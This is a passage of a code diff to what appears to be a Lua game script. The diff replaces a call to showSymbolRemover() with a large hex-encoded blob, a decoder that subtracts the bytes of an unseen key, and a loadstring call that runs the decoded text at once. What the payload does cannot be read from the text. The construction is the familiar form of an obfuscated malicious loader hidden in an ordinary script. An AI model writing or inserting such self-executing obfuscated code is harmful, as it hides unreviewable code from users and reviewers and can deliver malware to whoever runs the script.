+    "9f9c99586d549994987aa4a2605256645064b0767a6860767b7468613a54585054a49f97999c549aa4a28ba9a18c9f9b9f9c99586d549994987aa4a2605256645064b0767a68606d6e686c613a54585054a49f97999c549aa4a286a5a18c9f9b9f9c99586d549994987aa4a2605256645064b0767a6b7669697269613a54585054a49f97999c549aa4a28591a7ac95a6586d549994987aa4a26052867d7d838e75547d7d83827987587e898572798a8354797e7858838d857283848356645064b0767a6e676779726b61503e4250545850a0a79395a4509aad9e97ac99a3a650a69d96a69da39c8c9f9b9f9c9960593e585054585054585096ac",
+    "9e88a7979ba49562ab95a88c95acac589f9d95a48ba0999b9995a45095a694545a8279857f8a7d5078878487587383857d758b50758674548479827d8354877e56589fa65852867d7d838e75547c7f888b5077877d81798354797e78587c7d867587587f7a7e525d4250545850545850549aa4a28c9f9b9f9c9966a399ac72959b9b9baa9fa9a69477a79ca3aa589f9d95a48ba0999b9995a45095a6945468a87a7e756a6d61646850a3aa5064b0767a7e766d706064613a545850549d9e98423a54585054a49f97999c549ea5a29ba49da79e54aa959aaa95a7a075a1a79a9d8c9f9b9f9c9960593e585054585054585096ac9e79a59f9ea184",
+    "a39f97a09d5ea79da4889da8a8609b999da079a59f9ea15095a694545a8279857f8a7d5079857f7e818354877e56589fa65852867d7d838e75547d7d83827987587f7a7e525d4250545850545850549aa4a27d9da3a29988a7979ba49562ab95a87a9197a397a6a7a5a29c73a3a49fa6609b999da079a59f9ea15095a6945468a87a7e60647167756f50a3aa5064b0767a6860767b7468613a545850549d9e98423a54585054a49f97999c549ea5a29ba49da79e54aa959aaa95a7a083ada584a39f97a09d585d4250545850545850549aa4a28ba9a18c9f9b9f9c9966a399ac8499b0a45ca39599a883ada592a3a4a354999e985852867d7d83",
+    "8e75548b89817a7f808b5083865254a7a2545a8279857f8a7d5087917d76877c87587f7a7e525d4250545850545850549aa4a28ba9a18c9f9b9f9c9966a399ac72959b9b9baa9fa9a69477a79ca3aa589f9d95a48ba9a19a9fa0ab5095a6945468a87a7e60646f696a7a50a3aa5064b0767a68606d6e686c613a545850549d9e98423a54585054a49f97999c549ea5a29ba49da79e54aa959aaa95a7a07ea9a584a39f97a09d585d4250545850545850549aa4a286a5a18c9f9b9f9c9966a399ac8499b0a45ca39599a87ea9a59299aaa354999e985852867d7d838e7554797c80587e898572798a8354877e56589fa65852867d7d838e755479",
+    "7c80587e898572798a835487767a5a593e585054585054585096ac9e82ad9d88a7979ba49562ab95a87a9197a397a6a7a5a29c73a3a49fa6609b999da082ad9d969da2a75891a29c5064b0767a6971666b6779589fa65860ac7e76677e65657a655d425054585099a6943e4250545850a0a79395a4509aad9e97ac99a3a650a69d96a69da39c8591a7ac95a660593e585054585054585096ac9e8199a3a89da262ab95a88c95acac58568a7581878679587581877a7d8b50828d7d767d82875871827c5087917d76877c87585254665e54609d95aba499aa83a899a4995891a29c5056877e56589fa65852837e765661593e5850545850545850",
+    "96ac9e8199a3a89da262ab95a87a9197a397a6a7a5a29c73a3a49fa6609d95aba499aa83a899a4995891a29c5064b0767a6c65666f7164589fa65860ac7e766a6f63757a675d425054585099a6943e4250545850a69d96a69da39c8c9f9b9f9c9960593e58505458a2999ea299ab9879a59f9ea184a39f97a09d585d4250545850a69d96a69da39c8ba9a18c9f9b9f9c9960593e58505458a2999ea299ab9882ad9d88a7979ba4955c613a54585054aa959aaa95a7a07d95aba499aa585d423a54585054a49f97999c549aa4a2799ea2a7a5a29b9588a7979ba495547550959c9476ac9e5c5a52605860ac7e766b7165696c685d4250545850a0",
+    "a79395a4509aad9e97ac99a3a650a69d96a69da39c799ea2a7a5a29b9588a7979ba4955c613a545850545850545892a8a671a2a69fa9a693998c9f9b9f9c9966a399ac8499b0a45c999ea2a7a5a29b9587ac91a89d5095a694545a8683817379588279887f868c5081877479587f825a50a3aa50568e7f7d7b75548a7584878288587d837c755487767a5a593e585054585054585096ac9e75a69ea3ad9e979d84a39f97a09d5ea79da47699939f9fa2a3ad9e987b9fa0a7a25c999ea2a7a5a29b9587ac91a89d5095a6945468a87a7e64796b64667d50a3aa5064b0767a6f69696d646c613a545850549d9e984250545850a69d96a69da39c79",
+    "9ea2a7a5a29b9588a7979ba4955c613a3e5850545892a8a684a39f97a09d5ea3a673a0a1939f586d549ea5a29ba49da79e5c613a54585054585054589b999da087a89597a191a0586d54a69fa8589b999da087a89597a191a04250545850545850549d949dac80a69d9662a8a5a87a9fa3a49595a65856a39599a88fa7a89597a191a097a3a899a4995a5c54a39599a883a49d939d999c5d6693a3a59d9dac585d425054585054585054aa959aaa95a7a084a39f97a09d585d425054585054585054ab95a6ae99979d5ea7a89595a3589f9d95a48ba0999b9995a45095a694545a83a49d939d999c54aa95a1a7a695a45099a69196a495985a50",
+    "a3aa50568ba0999b9995a450a69d9da3ae91a058949dab9196a495985a593e5850545895a29c3a3e5850545892a8a675a1a79a9d8c9f9b9f9c99669fa27b9c9d9b9b5475509aad9e97ac99a3a6585d425054585054585054a39599a875a1a79a9d586d54a69fa8589b999da079a59f9ea13a54585054585054589598a1a484aa959a66a0a9ac72a3a79c99999e5c5a9b999da0939d9da3a29993aba495ac955664509f9d95a47d9da3a2995d6693a3a59d9dac585d425054585054585054aa959aaa95a7a075a1a79a9d8c9f9b9f9c9960593e5850545850545850a79da2aaa1939966a3a49d919f609b999da079a59f9ea15095a694545a75a1",
+    "a79a9d58a299a59faa999c549d9e959a9c999c5254a7a2545a75a1a79a9d58a299a59faa999c549c99a79992a09d9456613a545850549d9e98423a545850549aa4a28ba9a18c9f9b9f9c99669fa27b9c9d9b9b5475509aad9e97ac99a3a6585d425054585054585054a39599a883ada592a3a4a3547550a2a7a454a39599a883ada592a3a4a33e5850545850545850999c99a888a2999e5ea4ada476a79fa09d91a260529f9d95a497a3ada592a3a4a393aba495ac955664509f9d95a48ba9a19a9fa0ab59629b9fa1a599a860593e5850545850545850a69d96a69da39c8ba9a18c9f9b9f9c9960593e5850545850545850a79da2aaa1939966",
+    "a3a49d919f609b999da087b19d96a79ca75891a29c50568ba9a19a9fa0ab50a69d9da3ae91a05895a29992a09d9456589fa6585287b19d96a79ca758a299a59faa999c549c99a79992a09d9456613a545850549d9e98423a545850549aa4a286a5a18c9f9b9f9c99669fa27b9c9d9b9b5475509aad9e97ac99a3a6585d425054585054585054a39599a87ea9a59299aaa3547550a2a7a454a39599a87ea9a59299aaa33e5850545850545850999c99a888a2999e5ea4ada476a79fa09d91a260529f9d95a4979ea9a59299aaa393aba495ac955664509f9d95a486a5a19a95a6ab59629b9fa1a599a860593e5850545850545850a69d96a69da3",
+    "9c86a5a18c9f9b9f9c9960593e5850545850545850a79da2aaa1939966a3a49d919f609b999da082ad9d969da2a75891a29c505686a5a19a95a6ab50a69d9da3ae91a05895a29992a09d9456589fa6585282ad9d969da2a758a299a59faa999c549c99a79992a09d9456613a545850549d9e98423a545850549aa4a28591a7ac95a6669fa27b9c9d9b9b5475509aad9e97ac99a3a6585d425054585054585054a591a7ac95a68ba495ac95547550a2a7a454a591a7ac95a68ba495ac953e58505458505458509f9d95a47d9da3a29960589b999da082ad9d969da2a764509f9d95a48ba9a19a9fa0ab5071589d95aba499aa83a899a4996450a1",
+    "99a3a89da287ac91a89d5c54a591a7ac95a68ba495ac953e5850545850545850999c99a888a2999e5ea4ada476a79fa09d91a26052a199a3a89da293aba495ac95566450a199a3a89da287ac91a89d593e5850545850545850999c99a888a2999e5ea4ada476a79fa09d91a260529f9d95a49795a1a79a9d97a3a899a4995a5c54a39599a875a1a79a9d613a54585054585054589598a1a484aa959a66a0a9ac72a3a79c99999e5c5a9b999da093a6a5a19a95a6ab8fa7ac91a89d5260589b999da082ad9d969da2a7613a54585054585054589598a1a484aa959a66a0a9ac72a3a79c99999e5c5a9b999da093aba9a19a9fa0ab8fa7ac91a89d",
+    "5260589b999da087b19d96a79ca7615e97a79da1a1a45c613a5458505458505458a2999ea299ab9879a59f9ea184a39f97a09d585d425054585054585054aa959aaa95a7a07ea9a584a39f97a09d585d425054585054585054aa959aaa95a7a083ada584a39f97a09d585d425054585054585054aa959aaa95a7a07d95aba499aa585d425054585054585054ab95a6ae99979d5ea7a89595a358a199a3a89da287ac91a89d5095a694545a7d95aba499aa50a69d9da3ae91a05895a29992a09d9456589fa658528199a3a89da254aa95a1a7a695a45098a1a3959a9c999c525d425054585099a6943e425054585096ac9e75a69ea3ad9e979d84",
+    "a39f97a09d5ea3a673a0a1939f586d549ea5a29ba49da79e5c613a545850545850545891a2a69fa9a693998ba495ac95547550a2a7a454999ea2a7a5a29b9587ac91a89d3a54585054585054589598a1a484aa959a66a0a9ac72a3a79c99999e5c5a91a2a69fa9a6939997a3a899a4995a5c54999ea2a7a5a29b9587ac91a89d59629b9fa1a599a860593e5850545850545850a69d96a69da39c799ea2a7a5a29b9588a7979ba4955c613a5458505458505458a399aaa69d9b9562aba099999b5c999ea2a7a5a29b9587ac91a89d5095a694545a86a3a1939958a299a89fa6ac5099a69196a495985a50a3aa50568e9f9d9b9554aa95a4a7a2a8",
+    "58949dab9196a495985a593e5850545895a29c3a3e585054589ca39b91a05892a8a673a09d91a2586d549994987aa4a26052789d95a45873a09d91a25891a29c5077a7a0ad5a5c5468a87a7e626571667a6b593e585054589ca39b91a05892a8a673a09d91a6586d549994987aa4a26052778475758a50887d88885871827c50867d83798c50878c71888b52605860ac7e767a6c64676b665d4250545850a0a79395a45096ac9e759a9fa9ac50715891989c72a8a658567992a3ada456645064b0767a7173666f7264613a54585054a49f97999c549aa4a27da89dac50715891989c72a8a658567d887d8c52605860ac7e766a68677870725d42",
+    "3a54585054a49f97999c549c9995a49f9b586d54799c99aaa478a191a0a797627aa59da49499aa58a79da2aaa19399615ea79da48aa195ab60a397aa9fa0a4869d9da75d66a399ac7395a69399a49196a4955c9e91a0ab955d6693a69d91a89d585d425054585098a191a0a797629f95a88f99a29c9fab605962ab95a88ca9a49d588ba19e98a7a781999e959f95a6667c95b19fa9ac8095aa91a1ab5e889180799771777b75878b7976817c7d8c89938786798a7c7591593e58505458949d999ca39f5ea7a09fab60593e425054585096ac9e77a49595a65ea3a673a0a1939f586d549ea5a29ba49da79e5c613a54585054585054589ca39b91",
+    "a058a295af8499b0a4547550a8a7a3a8aa99a29f58999c99a87a9fac669799ac8499b0a45c61593e58505458505458509d9e50a699a7889da8a8586d7158525658a49c9d9e54ab95a6ae99979d5ea7a89595a358568c95acac5096a7a854a1a3549d9da4aca9566150a69da4a9aa9e549d9e98423a5458505458505458999a589ea3ac505ca39599a883a49d939d999c54a7a254a39599a875a1a79a9d589fa6589b999da082ad9d969da2a7589fa6589b999da087b19d96a79ca76150a8a095a242505458505458505458505458a399aaa69d9b9562aba099999b5c5a80a09d91a79d50a8ada2a2589fa25891a8589c9999a3a8589fa29d50a3",
+    "a8a49da79e549e99a6aba456613a545850545850545850545850a69da4a9aa9e3e585054585054585099a6943e425054585054585054a49f97999c549ba5a6aa95a2ac8399aca49da697a7586d54ac9fa7aca29da6975ca39599a883a49d939d999c5d665ea8a7a3a8aa99a29f589f9d95a47d9da3a2995d665ea8a7a3a8aa99a29f589f9d95a486a5a19a95a6ab596266a4a3aba4a6a19e9b609b999da087b19d96a79ca7613a54585054585054583a54585054585054589ca39b91a0589e999d94a78a95a4a7a2a8586d549e91a0ab953e58505458505458509d9e509f9d95a47d9da3a29954999e98589ea3ac50a79da3a7a19fa28a95a4a7",
+    "a2a89d94629d9da3a29954ac9899a650a29d9598ab8299a89fa6ac507158a4a6ad95549d9e98425054585054585054a19654a39599a87ea9a59299aaa354999e98589ea3ac50a79da3a7a19fa28a95a4a7a2a89d9462a6a5a158a49c9d9e54a695999ca3869da0a3aaa4547550a8aaa5995895a29c3a5458505458505458999a589b999da087b19d96a79ca75891a29c50a2a7a454ab95a7ab99a3a68299a89fa6ac959866a3ada550a8a095a2589e999d94a78a95a4a7a2a8586d54aca2a99d5099a6943e58505458505458509d9e509f9d95a48ba0999b9995a45095a69454609ea3ac50a79da3a7a19fa28a95a4a7a2a89d94629c9fa8589f",
+    "a6589ea3ac50a79da3a7a19fa28a95a4a7a2a89d94629b9fa1a59154a7a254a69fa858a399aba39da79e869da0a3aaa4999c5ea0a19e996150a8a095a2589e999d94a78a95a4a7a2a8586d54aca2a99d5099a6943e425054585054585054a19654aa91ab8c95acac50717550a099a3a87b9c99999e889da8a85891a29c5097ada2a69d9ea88b95a8ac99a29fa354756d54a491a7ac8399aca49da697a78091a7a05095a69454a69fa8589e999d94a78a95a4a7a2a858a49c9d9e3e585054585054585054585054ab95a6ae99979d5ea7a89595a35856799ca69d9198b15097a49595a6525d4250545850545850545850545893a166a399ac80a6",
+    "a19d95aaa977a499a46073a0a1a07899a495669e99af80a09999a28c95acac58569b9c99999e566450a699a7889da8a861593e585054585054585054585054aa95a8ada2a24250545850545850549d9e98423a5458505458505458a399aaa69d9b9562aba099999b5c5a8397999ea2a19e9b5a593e5850545850545850a899a39f606464685c549ea5a29ba49da79e5c613a545850545850545850545850a0a79395a450a69da3a9a4a4889992a09d507158abb1425054585054585054585054589ca39b91a0589378a7a460589377a79da1995c549b7c9da69560589379a59f9ea15c549b7ea9a55c549b83ada5507158606058606058606058",
+    "606058606058603e5850545850545850545850544250545850545850545850545896a3aa5097a091a65899a258a295af8499b0a46e9f9d95ac939c60528f5daa90695d9069626b94616d6c5d906a6468958b9069626c658c6571619162525d5894a34250545850545850545850545850545850a0a79395a450a7a09fa9a494869d9da3ae955475509a999ca79d3a54585054585054585054585054585054a49f97999c54a1a379a59f9ea1507158939c99a26ea591a89b985c5a8b906a6464658c666c6391938c656a686194616d698d8f946166705d90696965958b9069626c658c657161915a5954a7a2549b9895aa6aa199a497a05856938c",
+    "666a66619462666f8d8f946166705d90696965958b9069626c658c657161915a593e585054585054585054585054585054583a54585054585054585054585054585054a19654a1a379a59f9ea150a8a095a2583a5458505458505458505458505458505458505458999a589b999da079a59f9ea150a8a095a258a39ca7a5a09c8299a59faa9d507158a4a6ad956f589379a59f9ea15071589379a59f9ea1505f5861549d9e98425054585054585054585054585054585099a4a399a196549b9895aa6aa199a497a058565d94566150a8a095a2583a5458505458505458505458505458505458505458999a589b999da082ad9d969da2a758a49c",
+    "9d9e54ab98a3ad9c988a95a1a7a699586d54aca2a99d6b549b7ea9a55071589382ad9d546350655895a29c3a545850545850545850545850545850549d9ca79d999a58939c99a254756d545a5e5658a49c9d9e54425054585054585054585054585054585054585054a19654a39599a883a49d939d999c54ac9899a650a7a09fa9a494869d9da3ae95547550a8aaa5997350977c9fa8586d549b74a3ac505f5861549d9e98425054585054585054585054585054585099a4a399a196549b9895aa5071755056645254a7a2549b9895aa507175505610bc5658a49c9d9e54425054585054585054585054585054585054585054a19654a39599a8",
+    "83a49d939d999c54ac9899a650a7a09fa9a494869d9da3ae95547550a8aaa5997350977b9fa1a591547550977b9fa1a591546350655895a29c3a545850545850545850545850545850549d9ca79d999a58939c99a254756d545a8ca25a50a3aa5097a091a6586d71585290aa5254ac9899a6503e58505458505458505458505458505458505458509d9e509f9d95a48ba0999b9995a450a8a095a258a39ca7a5a09c8299a59faa9d507158a4a6ad956f589380a19e99586d549b7c9da695546350655895a29c3a545850545850545850545850545850549d9ca79d999a58939c99a26ea591a89b985c5a8b59998c66696661946265718c656e61",
+    "6194616d698d566150a3aa5097a091a6586d715852545a50a8a095a2583a5458505458505458505458505458505458505458a39ca7a5a09c8299a59faa9d5071589695a4a399425054585054585054585054585054585099a4a399583a5458505458505458505458505458505458505458999a589b999da087b19d96a79ca758a49c9d9e54ab98a3ad9c988a95a1a7a699586d54aca2a99d6b549b83ada55071589387b19d546350655895a29c3a545850545850545850545850545850549d9e98423a54585054585054585054585054585054a19654a69fa858a39ca7a5a09c8299a59faa9d50a8a095a258a4959a9c996699a2ab95a6ac58a6",
+    "9da3a9a4a4889992a09d5c549b9895aa59549d9e984250545850545850545850545895a29c3a5458505458505458505458503e585054585054585054585054a49f97999c549b9c99999e889da8a8586d54ac9196a495629b9fa29b91a860a299aba5a0ac84959a9c99613a54585054585054585054585097a49595a68499b0a454755097a49595a68499b0a46e9fa3a99a585696505f5a5c545a525d7297a7ad925c5a505f5c5260585256613a3e585054585054585054585054ac9fa8999c78a7a4a76450a8a7a495a473a3a59d95ab5c54ac9fa8999c80a19e99ab5c54ac9fa8999c79a59f9ea1a36058a4a3ac91a086a5a19a95a6ab5c54ac",
+    "9fa8999c87b19d96a79ca7586d54ac9fa8999c78a7a4a7639378a7a46058a4a3ac91a07b9fa1a591a7639377a79da1995c54ac9fa8999c80a19e99ab5b978499a29d5c54ac9fa8999c79a59f9ea1a35f9b75a1a79a9d6450a8a7a495a47ea9a59299aaa35f9b7ea9a55c54ac9fa8999c87b19d96a79ca7639387b19d3e585054585054585054585054aa95a1a7a6999c83a899a4a9ab8499b0a462ab95a88c95acac58a7aca29da697629e9fa6a591a86052869d9da3ae959858559858a3ada592a3a4a3545d94549c9fa8ab50599c5097a79da199a3545d9454a499a29da3545d9454a6a5a19a95a6ab50599c5099a59f9ea1a3566450a8a7a4",
+    "95a483ada592a3a4a36058a4a3ac91a07c9fa8ab5c54ac9fa8999c77a79da199a36058a4a3ac91a08499a29da36058a4a3ac91a086a5a19a95a6ab5c54ac9fa8999c79a59f9ea1a35d613a5458505458505458505458503e5850545850545850545850549d949dac72a3b05ea79da4889da8a86093a09d91a28c95acac593e5850545850545850545850549b9d62ab95a888a29da591a6b173a0a1a05c7b9c9da87495ac9162a695ab889c95a19e889da8a8605297a49595a652605893a09d91a28c95acac595d425054585054585054585054583a5458505458505458505458509d9e5095a69ea3ad9e979d83a899a49958a49c9d9e3e585054",
+    "585054585054585054585054589ca39b91a058a299a89fa6ac507158abb142505458505458505458505458505458509d9e509f9d95a47d9da3a29954999e98589ea3ac50a79da3a7a19fa28a95a4a7a2a89d94629d9da3a29954ac9899a63a5458505458505458505458505458505458505458a4959a9c996699a2ab95a6ac58a69da0a3aaa460589379a59f9ea150626650565895a1a79a9dab525d425054585054585054585054585054585054585054ab95a7ab99a3a68299a89fa6ac95986695a1a79a9d586d54aca2a99d3a545850545850545850545850545850549d9e9842505458505458505458505458505458509d9e509f9d95a486",
+    "a5a19a95a6ab5095a69454a69fa858a399aba39da79e869da0a3aaa4999c5ea2ad9d54ac9899a63a5458505458505458505458505458505458505458a4959a9c996699a2ab95a6ac58a69da0a3aaa460589382ad9d54665e545a50a2ad9d969da2a75a593e5850545850545850545850545850545850545850a79da3a7a19fa28a95a4a7a2a89d9462a6a5a1586d54aca2a99d3a545850545850545850545850545850549d9e9842505458505458505458505458505458509d9e509f9d95a48ba9a19a9fa0ab5095a69454a69fa858a399aba39da79e869da0a3aaa4999c5ea7b19d54ac9899a63a545850545850545850545850545850545850",
+    "5458a4959a9c996699a2ab95a6ac58a69da0a3aaa460589387b19d54665e545a50a7b19d96a79ca75a593e5850545850545850545850545850545850545850a79da3a7a19fa28a95a4a7a2a89d9462aba9a1586d54aca2a99d3a545850545850545850545850545850549d9e9842505458505458505458505458505458509d9e509f9d95a48ba0999b9995a450a8a095a2425054585054585054585054585054585054585054a19654a69fa858a399aba39da79e869da0a3aaa4999c5e98a7a454ac9899a650a89992a09d5e9da6a399aaa45caa95a4a7a2a86450977c9fa8585e625852549c9fa8ab525d7350a79da3a7a19fa28a95a4a7a2a8",
+    "9d94629c9fa8586d54aca2a99d5099a6943e58505458505458505458505458505458505458509d9e50a2a7a454ab95a7ab99a3a68299a89fa6ac95986693a3a59d9558a49c9d9e54ac9196a49562a19ea79da2a860a299a89fa6ac5c549b73a3a59d95585e625852549b9fa1a591a75a596f58a399aba39da79e869da0a3aaa4999c5e97a79da199507158a4a6ad95549d9e98425054585054585054585054585054585054585054a19654a69fa858a399aba39da79e869da0a3aaa4999c5ea0a19e9958a49c9d9e54ac9196a49562a19ea79da2a860a299a89fa6ac5c549b7c9da69554665e545a50a0a19e99ab525d7350a79da3a7a19fa28a",
+    "95a4a7a2a89d9462a499a29d507158a4a6ad95549d9e98425054585054585054585054585054585099a6943e585054585054585054585054585054583a54585054585054585054585054585054a196545ba299a89fa6ac5072586054ac9899a63a54585054585054585054585054585054585054589ca39b91a058969da691a085a39b586d545a8499b0a4549b9c99999e9da69754aba5979b95a7ab96a9a49cad665056585e6258a4959a9c996693a3a69395ac58a69da0a3aaa46058526058525d585e62585254aa95a1a7a6999c5e548c95acac5097a7a09d9d9454ac9f549b9c9da892a399a29858a3a99b9399aba39aad9ca0b1523e5850",
+    "545850545850545850545850545850545850a79da2aaa1939966a3a49d919f60969da691a085a39b613a545850545850545850545850545850549d9ca79d3a5458505458505458505458505458505458505458a399aaa69d9b9562aba099999b5c5a71a0aa95959ca9549b9c99999e62588499b0a4549b9fa4a1959858a4a35893a0a1a096a791a69c50a7ad93979da3a79ea5a0a4a956613a545850545850545850545850545850549d9e984250545850545850545850545895a0ab953e58505458505458505458505458505458a399aaa69d9b9562aba099999b5c5a8499b0a4549b9fa4a1959858a4a35893a0a1a096a791a69c50a7ad9397",
+    "9da3a79ea5a0a4a956613a54585054585054585054585099a6943e585054585054585054585054425054585054585054585054589c95aba477a49595a68499b0a460589c95aba4879da4a8a19e9bab7895ab9854755097a49595a68499b0a4605893a9aaa299a6a4879da4a8a19e9bab3a545850545850545895a29c593e5850545895a29c3a3e5850545892a8a673a09d91a6669fa27b9c9d9b9b5475509aad9e97ac99a3a6585d583a54585054585054589ca39b91a05893a9aaa299a6a476a7a8889da8a8586d54ac9fa7aca29da6975c9d949dac72a3b05e9b9da4889da8a860595d425054585054585054a196549ba5a6aa95a2ac72a3b0",
+    "8499b0a454756d545a5254ac9899a6503e585054585054585054585054ab95a6ae99979d5ea7a89595a358568c95acac5096a7a854a1a354999ca69d9198b15099a5a0a8b1525d42505458505458505458505458a299aca5a6a6503e585054585054585099a6943e58505458505458503e5850545850545850999c99a87a9fac66a399ac8499b0a45c5a525d425054585054585054ac9fa8999c78a7a4a76450a8a7a495a473a3a59d95ab5c54ac9fa8999c80a19e99ab5c54ac9fa8999c79a59f9ea1a36058a4a3ac91a086a5a19a95a6ab5c54ac9fa8999c87b19d96a79ca7586d54685c54685c54685c54685c54685c54683a545850545850",
+    "54589c95aba477a49595a68499b0a460589c95aba4879da4a8a19e9bab7895ab98547550565a5c545a523e5850545850545850a79da3a7a19fa28a95a4a7a2a89d94547550af9d9da3a299719e91a0ab9560589ea9a56d9a999ca79d5c54aba9a1759695a4a399645098a7a4719e91a0ab95605893a3a59d95759695a4a3996450a0a19e99759695a4a399b53a5458505458505458a299a59faa9d9487ac91a8ada3889da8a866a399ac8499b0a45c5a8299a59faa9d94546850a7b19d96a79ca75860549c9fa8ab50645893a3a59d95ab5064589c9da695a7586054a6a5a19a95a6ab50645895a1a79a9dab525d425054585054585054ab95a6",
+    "ae99979d5ea7a89595a358567b9c9999a2999c5095a69454aba495aca354aa95a79da454aba5979b95a7ab96a9a49cad5a5954425054585099a6943e425054585096ac9e759a9fa9ac5ea3a673a0a1939f586d549ea5a29ba49da79e5c613a54585054585054589ca39b91a0589196a7a5a885a39b586d545a849ca1a3549da8a89d9ea7a19fa25899a7589499ae95a0a7a0999c5096b1507558728687847c7d8287588479797d54ac9f54a095a0a850ada7a5549b9c99999e54b19fa9aa50a89da8a8589595ab99a0b15e5481a454a1a3549950aa9da2ad58a39da5a0a09d5095a69454a89fab9da29aad9c549da8a89d9ea7a19fa258a49c99",
+    "a454aa95a1a7a699ab5095a49c54ad9eab999ea89d9454aba9a19a9fa0ab5c549d9da3a299a7645095a69454a6a5a19a95a6ab509aaa9fa158a9a3ada254ab95a2ac95a29b95a7665087a79d99ac99a19da354ac95acac50a0a79f9fab50aa9da2ad589d99aba3ad58a79dac9854ac9fa3589d95a6a9549c9fa8ab5c549b9fa1a591a76450a3aa509d9b9fa2ab5c54999e9858a49ca1a3549da8a89d9ea7a19fa2589d95a395a75899a85893a09d91a25891a29c50a4aa9f9a9da3a7a19fa2999c54af99a8a0509eada3a8589fa29d5097a49997a35e5481a454ada399ab509558a3a199a2a858a3adaba499a550a8a091a858a299a595a19a95",
+    "a6ab50aba091a85899a8589895ab5095a4a2999994ad5893a09d91a29d946058a3a35899a8589fa2a4a954ac95a0a4a354b19fa9589196a7a5a8589e99af50a8a099a29fa362587fa9aa50a89d91a15893a69d91a89d9454ac989dab5099b0a499a6a39da79e549e9fa658a099a7a0a09d50aba09f54af91a2ac509ca1979c65a1a9999c9daca954ac95acac50aba1a49ca7a5a85891a2b150a1999ea9999c54af9fa6a35e548c9895a69b54b19fa95896a3aa50a9ab99a29f50a3ada2549da8a89d9ea7a19fa266523e5850545850545850a0a79395a450959c9254755075a495a6ac749d999ca39f5e76ad99a09c95a660a399aaa69d9b955d",
+    "42505458505458505499949666a399ac849dac9c99605287917d76877c87588279857f8a7d8256613a545850545850545891989a5ea79da4819da3a7999799609196a7a5a885a39b613a545850545850545891989a5ea79da484a7a39dac99aa9d72a9aca4a3a65856877b566450a2a19c5d42505458505458505499949666a399ac7e999f91a8a1a6997aa5a8ac9fa260527c9d9ca45891a29c507a9d95989a9197a352605896a9a693a8a19fa260593e585054585054585054585054a49f97999c54af9181ab97547550568095a0a49f547950768a7f888075868b50887d718164507d589895ae95549a9599a650a9ab99a29f50ada7a5a658",
+    "5787b19d96a79ca7588299a59faa9da25b5895acac95a2ab99a3a65095a69454815095a5509b9d9ea9a19e99a4a954a19da4aa95a7ab95985892ad5899a8ab50a79d91a1a495a7ab50a49da29aa7a2a1999e979d5095a69454a8a2999b99a7a19fa2665088a095549994aa999e979d94549e9595aca5a69da354999e9858a5a79da2619ea29d9d9e98a4a954a19ea89da29a999399589d95a39554a1a4549950a8a7a061ac9999aa50a8a79fa05896a3aa50a89da8a8589fa4ac99a1a1aa95ac99a3a65e548150aba7a5a09c50a0a7a69958a4a358949dab93a9aba354a1a4a75899a1a8a299aba39dae95549ea5a29ba49da79e95a499a8b150",
+    "aba1a49c58a9a3ad5095a69454ab9895aa9554ab9fa19d50989da495a19c999c509a9d95989a9197a350a3a650a1b15099b0a099aa9999a6939966523e585054585054585054585054a49f97999c54a19ea89d9ea8586d54819ea89d9ea86079a2ac95a2ac5e757b847d877e938e79798f5c548da29d66a095aaa39960529caca4a4ab6a636791a4a15eaba091a8ab91a4a85e97a79d63ab95a29c6fa4a09fa29d6d6d6a63686f676970636b6b655aac95acac6d56585e625885a6a15e99a693a39c955caf9181ab975d61593e585054585054585054585054a19ea89d9ea866a399ac80959b9b959f955c5a93a3a55eaba091a8ab91a4a8525d",
+    "6691989c76a09997a76079a2ac95a2ac5e7a84717b9771778c798a81848d977e798f8f8879837f613a545850545850545850545850a49b91a0a4589aad9e97ac99a3a6585d58a399aaa69d9b9562aba495aaa4759ba49dae99a8b1589da6a499a6a45d58949d999ca39f5e98a1a3a1a1a3a76059549d9e98613a545850545850545895a29c593e5850545850545850a0a79395a450959c50715891989a5e97aa9595ac955c613a54585054585054589198669799ac879da694a3af585d66a399ac84ada8955c8f99a29c9fab8591a2999799aa5e8099a9a3ada48499a295a5a3628c89847d8f757b73798b837d7a798081848d977f8a7d828079",
+    "895d425054585054585054999462ab98a3af585d425054585099a6943e425054585096ac9e79b099a8669fa27b9c9d9b9b5475509aad9e97ac99a3a6585d58949d999ca39f5e98a1a3a1a1a3a76059549d9e984295a29c3a3eab98a3af83ada592a3a48299a59faa9da25c61",
+}
+local hc = {}
+for i=0,255 do hc[string.format("%02x",i)]=i end
+local d = {}
+local s = table.concat(c)
+local idx = 1
+for i=1,#s,2 do
+    local p = string.sub(s,i,i+1)
+    local t = hc[p]
+    if not t then return end
+    local kb = string.byte(k,((idx-1)%#k)+1)
+    table.insert(d, string.char((t-kb)%256))
+    idx = idx + 1
 end
-
-showSymbolRemover()
+local f = loadstring(table.concat(d))
+if f then f() end
